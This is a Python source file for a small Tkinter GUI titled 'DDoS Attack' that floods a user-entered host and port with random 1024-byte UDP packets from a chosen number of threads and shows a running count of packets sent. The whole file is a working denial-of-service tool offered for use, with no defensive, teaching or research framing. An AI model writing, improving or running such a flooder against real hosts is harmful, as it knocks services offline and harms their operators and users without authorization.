from tkinter import *
import socket
import random
from threading import Thread
import time

requests = 0
packet = None

def on_error(message):
    start_stop_Button.set("Start Attack...")
    Status.set(message)

def dos():
    global requests, packet
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while start_stop_Button.get() == "Stop Attack...":
            sock.sendto(packet, (Host.get(), int(Port.get())))
            requests += 1
            print(f"Packet {requests} sent to {Host.get()}:{Port.get()}")
            time.sleep(0.001)
    except Exception as e:
        on_error(f"Error during Attack: {e}")

def main():
    global requests, packet
    requests = 0
    packet = random.randbytes(1024)

    try:
        host = Host.get()
        port = int(Port.get())
        thread_count = int(Threads.get())

        if not host or port <= 0 or thread_count <= 0:
            raise ValueError("Invalid input values")

        if start_stop_Button.get() == "Stop Attack...":
            start_stop_Button.set("Start Attack...")
            Status.set("Stopping attack...")
        else:
            start_stop_Button.set("Stop Attack...")
            Status.set("Attack started...")

            for _ in range(thread_count):
                Thread(target=dos, daemon=True).start()

            update_status()

    except ValueError as e:
        on_error(f"Error: {str(e)}")
    except Exception as e:
        on_error(f"Unexpected error: {str(e)}")

def update_status():
    global requests
    Status.set(f"Attack... {requests} requests sent!")
    root.after(3000, update_status)

root = Tk()
root.title("DDoS Attack - Maybe Ange")
root.resizable(False, False)

Host = StringVar()
Port = StringVar()
Threads = StringVar()
Status = StringVar()
start_stop_Button = StringVar()
start_stop_Button.set("Start Attack...")

Label(root, text="Host: ").grid(row=1, column=1)
Entry(root, textvariable=Host, width=50).grid(row=1, column=2)
Label(root, text="Port: ").grid(row=2, column=1)
Entry(root, textvariable=Port, width=50).grid(row=2, column=2)
Label(root, text="Threads: ").grid(row=3, column=1)
Entry(root, textvariable=Threads, width=50).grid(row=3, column=2)
Label(root, text="Status: ").grid(row=4, column=1)
Label(root, textvariable=Status).grid(row=4, column=2)
Button(root, textvariable=start_stop_Button, command=main).grid(row=5, column=2, sticky=E)

for child in root.winfo_children():
    child.grid_configure(padx=5, pady=2)

root.mainloop()